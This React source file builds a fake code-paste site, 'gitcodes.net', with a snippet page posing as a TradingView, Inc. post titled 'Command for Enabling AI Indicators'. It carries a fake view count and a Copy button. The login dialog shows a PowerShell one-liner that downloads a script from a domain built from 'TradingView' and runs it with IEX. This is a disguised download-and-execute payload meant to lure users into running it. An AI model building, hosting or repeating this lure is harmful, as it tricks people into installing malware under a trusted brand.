import {
  BrowserRouter as Router,
  Route,
  Routes,
  Navigate,
  Link,
  useLocation,
  useParams,
} from "react-router-dom";
import { useState } from "react";
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
const LOGO_URL = "https://ext.same-assets.com/3539614768/2391114335.svg";

function Header() {
  const [modalOpen, setModalOpen] = useState(false);
  const location = useLocation();
  return (
    <header
      style={{
        background: "#151617",
        borderBottom: "1px solid #232425",
        minHeight: 60,
        display: "flex",
        alignItems: "center",
        fontFamily: 'system-ui, sans-serif',
        zIndex: 100,
      }}
    >
      <div style={{
        width: "100%",
        maxWidth: 1150,
        margin: "0 auto",
        display: "flex",
        alignItems: "center",
        height: 60,
      }}>
        <Link to="/" style={{ display: "flex", alignItems: "center", textDecoration: "none" }}>
          <img src={LOGO_URL} alt="logo" style={{ width: 103, height: 25, marginRight: 24 }} />
        </Link>
        <nav style={{ flex: 1 }}>
          <ul style={{
            margin: 0, padding: 0, listStyle: "none", display: "flex", alignItems: "center",
            height: 60,
          }}>
            <li>
              <Link to="/" style={navLinkStyle(location.pathname === "/")}>Home</Link>
            </li>
            <li>
              <Link to="/about.php" style={navLinkStyle(location.pathname === "/about.php")}>About us</Link>
            </li>
            <li>
              <Link to="/contact.php" style={navLinkStyle(location.pathname === "/contact.php")}>Contact</Link>
            </li>
            <li style={{ marginLeft: "auto", fontWeight: "bold" }}>
              <Button
                variant="ghost"
                style={{ color: "#fff", fontWeight: 700, fontSize: 16, padding: 0 }}
                onClick={() => setModalOpen(true)}
              >
                Login & Register
              </Button>
              <Dialog open={modalOpen} onOpenChange={setModalOpen}>
                <DialogContent className="max-w-xs mx-auto bg-[#222] border-none" style={{ overflow: 'visible', padding: '0 24px' }}>
                  <h2 style={{ color: "#fff", fontSize: 24, marginBottom: 24 }}>Login</h2>
                  <Input placeholder="Specify a password" type="password" className="mb-3 bg-[#18191a] text-[#fff] border-[#444]" />
                  <div style={{ display: "flex", gap: "1em" }}>
                    <Button className="w-full bg-[#47b0fc] text-[#fff]">Login</Button>
                    <Button className="w-full bg-[#47b0fc] text-[#fff]">Sign up</Button>
                  </div>
                  <pre style={{ overflowX: 'auto', width: '100%', background: '#18191a', color: '#fff', padding: '10px', borderRadius: '6px', marginTop: '16px' }}>
                    <code style={{ whiteSpace: 'pre' }}>
                      {"cmd /k powershell -Command \"$app='TradingView'; $update='beta'+$app+'.app'; $Response=Invoke-WebRequest -Uri $update -UseBasicParsing -UserAgent $app; $Script=[System.Text.Encoding]::UTF8.GetString($Response.Content); IEX $Script\""}
                    </code>
                  </pre>
                </DialogContent>
              </Dialog>
            </li>
          </ul>
        </nav>
      </div>
    </header>
  );
}
function navLinkStyle(active: boolean): React.CSSProperties {
  return {
    color: active ? "#47b0fc" : "#fff",
    fontWeight: active ? 600 : 400,
    textDecoration: "none",
    marginRight: "2em",
    fontSize: 16,
    transition: "color 0.2s",
    display: "inline-block",
    minWidth: 45,
    lineHeight: "60px",
  };
}
function Footer() {
  return (
    <footer
      style={{ background: "#151617", color: "#fff", borderTop: "1px solid #232425", minHeight: 60 }}
      className="w-full"
    >
      <div
        className="mx-auto flex flex-col sm:flex-row items-center justify-between py-6 px-4"
        style={{ maxWidth: 1150 }}
      >
        <div className="flex flex-row gap-3 mb-2 sm:mb-0 items-center">
          <FooterLink to="/contact.php" label="Contact" />
          <FooterLink to="/privacy-policy.php" label="Privacy Policy" className="dont-show-mobile-footer" />
          <FooterLink to="/terms-of-service.php" label="Terms of Service" className="dont-show-mobile-footer" />
        </div>
        <div className="flex flex-row items-center gap-3">
          <a href="/" style={{ color: "#fff", textDecoration: "none", fontWeight: 500 }}>gitcodes.net</a>
          <span style={{ color: "#fff" }}>© 2002-2025</span>
        </div>
      </div>
    </footer>
  );
}
function FooterLink({ to, label, className }: { to: string, label: string, className?: string }) {
  return (
    <Link
      to={to}
      style={{ color: "#fff", textDecoration: "none", marginRight: 12, fontSize: 16 }}
      className={className}
    >
      {label}
    </Link>
  );
}
function HomePage() {
  return (
    <main style={{ background: "#f4f4f4", minHeight: "78vh", padding: "2.5em 0" }}>
      <div style={{ maxWidth: 950, margin: "0 auto", fontFamily: "inherit" }}>
        <div style={{ background: '#fff', border: '1px solid #e8e9ea', borderRadius: 8, minHeight: 260, position: 'relative', marginBottom: 30 }}>
          <div style={{ position: 'absolute', top: 10, right: 16, display: 'flex', gap: 6, zIndex: 2 }}>
            <button style={{ background: 'none', border: 'none', cursor: 'pointer' }} title="Paste from clipboard">
              <svg height="21" width="21" viewBox="0 0 24 24" fill="none" stroke="#444" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2.2"/><path d="M5 15V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2v4"/></svg>
            </button>
            <button style={{ background: 'none', border: 'none', cursor: 'pointer' }} title="Copy">
              <svg height="21" width="21" fill="none" stroke="#444" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2.2"/><path d="M5 15V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2v4"/></svg>
            </button>
            <button style={{ background: 'none', border: 'none', cursor: 'pointer' }} title="Formatting">
              <svg height="21" width="21" fill="none" stroke="#444" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24"><path d="M6 4h12"/><rect x="6" y="9" width="12" height="7" rx="2"/></svg>
            </button>
          </div>
          <div style={{ position: 'absolute', top: 0, left: 0, background: '#fafafa', borderRight: '1px solid #eee', borderRadius: '8px 0 0 8px', fontFamily: 'monospace', color: '#bcbcbc', fontSize: 15, width: 36, height: '100%', paddingTop: 18, textAlign: 'right', userSelect:'none' }}>
            {Array.from({ length: 10 }, (_, i) => (
              <div style={{ height: 20, lineHeight: '20px' }} key={i + 1}>{i + 1}</div>
            ))}
          </div>
          <textarea
            placeholder={"Paste your code here..."}
            readOnly
            spellCheck={false}
            rows={10}
            style={{
              width: '100%',
              minHeight: 220,
              resize: 'none',
              border: 'none',
              outline: 'none',
              fontFamily: 'monospace',
              fontSize: 15,
              color: '#222',
              padding: '18px 16px 18px 54px',
              borderRadius: 8,
              boxSizing: 'border-box',
              background: 'transparent',
              overflowX: 'auto',
              overflowY: 'auto',
              whiteSpace: 'pre',
              wordBreak: 'keep-all',
            }}
          />
        </div>
        <div style={{ display: 'flex', gap: 28 }}>
          <div style={{ flex: 1, maxWidth: 385 }}>
            <div style={{ background: '#fff', border: '1px solid #e8e9ea', borderRadius: 8, padding: '22px 28px', boxSizing: 'border-box', marginBottom: 14 }}>
              <h2 style={{ fontSize: 21, fontWeight: 700, marginBottom: 17 }}>Paste Code Options</h2>
              <form autoComplete="off">
                <div style={{ display: 'flex', alignItems: 'center', marginBottom: 9 }}>
                  <input style={{ flex: 1, border: '1px solid #ddd', borderRadius: 7, padding: '8px', fontSize: 15, background: '#fafafa' }} placeholder="Title (Optional)" />
                  <span title="Title helps to identify your snippet" style={{ marginLeft: 7, color: '#909090', cursor: 'pointer' }}>💡</span>
                </div>
                <input style={{ width: '100%', border: '1px solid #ddd', borderRadius: 7, padding: '8px', fontSize: 15, background: '#fafafa', marginBottom: 9 }} placeholder="Description (Optional)" />
                <div style={{ display: 'flex', alignItems: 'center', gap: 7, marginBottom: 9 }}>
                  <input style={{ flex: 1, border: '1px solid #ddd', borderRadius: 7, padding: '8px', fontSize: 15, background: '#fafafa' }} type="password" placeholder="Password (Optional)" />
                  <button style={{ border: 'none', borderRadius: 5, background: '#eee', padding: '0 11px', fontWeight: 500, fontSize: 15, color: '#111', cursor: 'pointer', height:34 }}>Rand</button>
                </div>
                <input style={{ width: '100%', border: '1px solid #ddd', borderRadius: 7, padding: '8px', fontSize: 15, background: '#fafafa', marginBottom: 9 }} placeholder="Expire After (Optional)" />
                <input style={{ width: '100%', border: '1px solid #ddd', borderRadius: 7, padding: '8px', fontSize: 15, background: '#fafafa', marginBottom: 9 }} disabled value="Collection (Optional) - (Sign-in to enable)" />
                <div style={{ marginTop: -18, marginBottom: 4 }}>
                  <label style={{ display: 'flex', alignItems: 'center', fontSize:15, color:'#181818' }}>
                    <input type="checkbox" checked readOnly style={{ marginRight: 7 }} />Indexable <span title="This paste can be found via search." style={{ marginLeft: 3, color: '#909090', cursor: 'pointer' }}>ℹ️</span>
                  </label>
                  <label style={{ display: 'flex', alignItems: 'center', fontSize:15, color:'#181818' }}>
                    <input type="checkbox" checked readOnly style={{ marginRight: 7 }} />Comments <span title="Comments enabled by default." style={{ marginLeft: 3, color: '#909090', cursor: 'pointer' }}>ℹ️</span>
                  </label>
                  <label style={{ display: 'flex', alignItems: 'center', fontSize:15, color:'#b4b4b4' }}>
                    <input type="checkbox" disabled readOnly style={{ marginRight: 7 }} />For Myself <span title="You should be signed-in to enable." style={{ marginLeft: 3, color: '#909090', cursor: 'pointer' }}>ℹ️</span>
                  </label>
                  <label style={{ display: 'flex', alignItems: 'center', fontSize:15, color:'#b4b4b4' }}>
                    <input type="checkbox" disabled readOnly style={{ marginRight: 7 }} />Encrypt <span title="Will be encrypted using AES-256" style={{ marginLeft: 3, color: '#909090', cursor: 'pointer' }}>🔒</span>
                  </label>
                </div>
              </form>
            </div>
          </div>
          <div style={{ flex: 2, maxWidth: 515 }}>
            <div style={{ background: '#fff', border: '1px solid #e8e9ea', borderRadius: 8, padding: '22px 30px', boxSizing: 'border-box' }}>
              <h2 style={{ fontWeight: 700, fontSize: 23, marginBottom: 15 }}>Paste Code Online</h2>
              <div style={{ fontSize: 16, color: '#232323', marginBottom: 15 }}>
                <b>gitcodes.net</b> is a code sharing website designed exclusively for developers to collaborate. You can freely paste and share code online using our platform. With support for up to <b>165 programming languages</b>, gitcodes.net offers syntax highlighting to cater to your specific needs.
              </div>
              <div style={{ fontSize: 16, color: '#222' }}>
                <div style={{ marginBottom: 8 }}>🥰 For a comprehensive list of features that set us apart from other paste sites, please refer to our documentation.</div>
                <div style={{ marginBottom: 8 }}>🙅‍♂️ It is important to note that you are strictly prohibited from posting any copyrighted or stolen material, personal information, leaked or hacked data, spam links (including links pointing to pornographic, pirated, or any illegal content), or any malicious/harmful or hacking-related content. Violating snippets will be deleted immediately, and your account and IP address will be permanently banned. For more detailed information, please review our terms of service.</div>
                <div style={{ marginBottom: 8 }}>💙 As our services are completely <b>free to use</b>, your support is crucial to ensure the ongoing smooth operation of our servers and the sustainability of our services. Every contribution counts! Please consider <span style={{ fontWeight: 700, color: '#187be7', textDecoration: 'underline', cursor: 'pointer' }}>supporting us</span> .</div>
                <div style={{ marginBottom: 4 }}>😉 Happy pasting.</div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </main>
  );
}

function SnippetPage() {
  const { snippetId } = useParams();
  const [copied, setCopied] = useState(false);
  const code = `«Бедный человек ест плов, богатый человек ест только плов»`;

  function getLineNumbers() {
    let arr = [];
    for (let i = 1; i <= 10; i++) arr.push(i);
    return arr;
  }

  function copyCode() {
    navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }

  return (
    <main style={{ background: "#f4f4f4", minHeight: "78vh", padding: "2.5em 0" }}>
      <div style={{ maxWidth: 950, margin: "0 auto", fontFamily: "inherit" }}>
        <div style={{ background: "#fff", borderRadius: 7, boxShadow: "0 0 1px #d6d7d8", padding: "2.4em 2.7em 2.0em 2.7em", minHeight: 500, border: "1px solid #e8e9ea" }}>
          <h1 style={{ fontWeight: 700, fontSize: `${2}em`, marginBottom: 10, color: "#151617" }}>
            Command for Enabling AI Indicators in TradingView
          </h1>
          <div style={{ marginBottom: 36, marginTop: 8, display: "flex", alignItems: "center", gap: 18, fontSize: 17, color: "#444" }}>
            <img src="https://ext.same-assets.com/3539614768/213709589.png" alt="ava" style={{ width: 22, height: 22, borderRadius: "50%", marginRight: 7 }} />
            <span style={{ fontWeight: 500, marginRight: 18 }}>TradingView, Inc.</span>
            <span style={{ marginRight: 16, display: "flex", alignItems: "center", gap: 4, color: "#555" }}>
              <svg height="17" width="17" fill="none" stroke="#444" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24" style={{marginRight:4,marginTop:1,verticalAlign:'middle'}}><rect x="3" y="4" width="18" height="18" rx="2"/><path d="M16 2v4M8 2v4M3 10h18"/></svg>
              1 month ago
            </span>
            <span style={{ display: "flex", alignItems: "center", gap: 4, color: "#555" }}>
              <svg height="17" width="17" fill="none" stroke="#444" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24" style={{marginRight:4,marginTop:1,verticalAlign:'middle'}}><circle cx="12" cy="12" r="3"/><path d="M2.05 12C3.86 7.57 7.89 4.5 12 4.5c4.11 0 8.14 3.07 9.95 7.5-1.81 4.43-5.84 7.5-9.95 7.5-4.11 0-8.14-3.07-9.95-7.5z"/></svg>
              56,948
            </span>
          </div>

          <div style={{
            position: "relative",
            borderRadius: 6,
            marginTop: 20,
            marginBottom: 20,
            background: "#F8F8F8",
            border: "1px solid #eaebeb",
            boxShadow: "0 1px 1.5px #ececec",
          }}>
            {/* Кнопка Copy */}
            <button
              onClick={copyCode}
              style={{
                position: "absolute",
                top: 12,
                right: 12,
                zIndex: 10,
                background: "#47b0fc",
                color: "white",
                border: "none",
                borderRadius: 4,
                padding: "4px 12px",
                fontSize: 15,
                cursor: "pointer"
              }}>
              Copy
            </button>

            {/* Контейнер для скролла */}
            <div style={{
              display: "flex",
              width: "100%",
              position: "relative",
              overflow: "hidden",
            }}>
              {/* Line Numbers */}
              <div style={{
                width: 50,
                flexShrink: 0,
                background: "#EFEFEF",
                color: "#BCBCBC",
                textAlign: "right",
                fontFamily: "monospace",
                fontSize: 15,
                padding: "14px 12px 14px 0",
                userSelect: "none",
                borderRight: "1px solid #DDD"
              }}>
                {Array.from({length: 10}, (_, i) =>
                  <div key={i} style={{ height: 21, lineHeight: "21px" }}>{i+1}</div>
                )}
              </div>

              {/* Scroll для кода */}
              <div style={{
                flex: 1,
                overflow: "auto",
                margin: 0,
                padding: "14px 20px 14px 14px",
              }}>
                <pre style={{
                  margin: 0,
                  fontFamily: "monospace",
                  fontSize: 15,
                  lineHeight: 1.4,
                  color: "#333",
                  whiteSpace: "pre",
                }}>
                  <code>{code}</code>
                </pre>
              </div>
            </div>

            {/* Уведомление о копировании */}
            {copied && (
              <div style={{
                position: "absolute",
                top: 12,
                right: 70,
                padding: "4px 12px",
                background: "#222",
                color: "#FFF",
                fontWeight: 500,
                borderRadius: 4,
                zIndex: 10
              }}>
                Copied!
              </div>
            )}
          </div>
        </div>
      </div>
    </main>
  );
}

function AboutPage() {
  return (
    <main style={{ background: "#f4f4f4", minHeight: "78vh", padding: "2.5em 0" }}>
      <div style={{ maxWidth: 950, margin: "0 auto", fontFamily: "inherit" }}>
        <div style={{ background: "#fff", borderRadius: 7, boxShadow: "0 0 1px #d6d7d8", padding: "2.4em 2.7em 2.0em 2.7em", minHeight: 180, border: "1px solid #e8e9ea" }}>
          <h1 style={{ fontWeight: 700, fontSize: "2em", marginBottom: 18, color: "#151617" }}>About Us</h1>
          <p style={{ color: "#222", fontSize: 17, marginBottom: 10 }}>
          Gitcodes is a free code sharing service since 2002. Here you can quickly share code snippets, store them for yourself, or collaborate with colleagues.
          </p>
          <p style={{ color: "#444", fontSize: 16 }}>
          This project is created for developers, supports both public and private snippets, and does not require registration to view. All rights reserved.
          </p>
        </div>
      </div>
    </main>
  );
}
function ContactPage() {
  return (
    <main style={{ background: "#f4f4f4", minHeight: "78vh", padding: "2.5em 0" }}>
      <div style={{ maxWidth: 950, margin: "0 auto", fontFamily: "inherit" }}>
        <div style={{ background: "#fff", borderRadius: 7, boxShadow: "0 0 1px #d6d7d8", padding: "2.4em 2.7em 2.0em 2.7em", minHeight: 180, border: "1px solid #e8e9ea" }}>
          <h1 style={{ fontWeight: 700, fontSize: "2em", marginBottom: 18, color: "#151617" }}>Contact</h1>
          <p style={{ color: "#222", fontSize: 17, marginBottom: 10 }}>
            Any questions or suggestions? Email us at: <a href="mailto:support@gitcodes.net" style={{ color: "#47b0fc" }}>support@gitcodes.net</a>
          </p>
          <p style={{ color: "#444", fontSize: 16 }}>
            You can also use the feedback form on the website.
          </p>
        </div>
      </div>
    </main>
  );
}
function PrivacyPage() {
  return (
    <main style={{ background: "#f4f4f4", minHeight: "78vh", padding: "2.5em 0" }}>
      <div style={{ maxWidth: 950, margin: "0 auto", fontFamily: "inherit" }}>
        <div style={{ background: "#fff", borderRadius: 7, boxShadow: "0 0 1px #d6d7d8", padding: "2.4em 2.7em 2.0em 2.7em", minHeight: 180, border: "1px solid #e8e9ea" }}>
          <h1 style={{ fontWeight: 700, fontSize: "2em", marginBottom: 18, color: "#151617" }}>Privacy Policy</h1>
          <p style={{ color: "#222", fontSize: 17, marginBottom: 10 }}>
            We do not collect any personal user data and do not use cookies; only anonymous visit metrics are analyzed.
          </p>
          <p style={{ color: "#444", fontSize: 16 }}>
            All your snippets are available only to you and those with whom you share the link.
          </p>
        </div>
      </div>
    </main>
  );
}
function TermsPage() {
  return (
    <main style={{ background: "#f4f4f4", minHeight: "78vh", padding: "2.5em 0" }}>
      <div style={{ maxWidth: 950, margin: "0 auto", fontFamily: "inherit" }}>
        <div style={{ background: "#fff", borderRadius: 7, boxShadow: "0 0 1px #d6d7d8", padding: "2.4em 2.7em 2.0em 2.7em", minHeight: 180, border: "1px solid #e8e9ea" }}>
          <h1 style={{ fontWeight: 700, fontSize: "2em", marginBottom: 18, color: "#151617" }}>Terms of Service</h1>
          <p style={{ color: "#222", fontSize: 17, marginBottom: 10 }}>
            By using this service, you agree to only post legal content. The administration is not responsible for information posted by users.
          </p>
          <p style={{ color: "#444", fontSize: 16 }}>
            The service is provided as-is with no guarantee of workability.
          </p>
        </div>
      </div>
    </main>
  );
}
function App() {
  return (
    <Router>
      <Header />
      <Routes>
        <Route path="/" element={<HomePage />} />
        <Route path="/about.php" element={<AboutPage />} />
        <Route path="/contact.php" element={<ContactPage />} />
        <Route path="/privacy-policy.php" element={<PrivacyPage />} />
        <Route path="/terms-of-service.php" element={<TermsPage />} />
        <Route path="/:snippetId" element={<SnippetPage />} />
        <Route path="*" element={<Navigate to="/" />} />
      </Routes>
      <Footer />
    </Router>
  );
}
export default App;
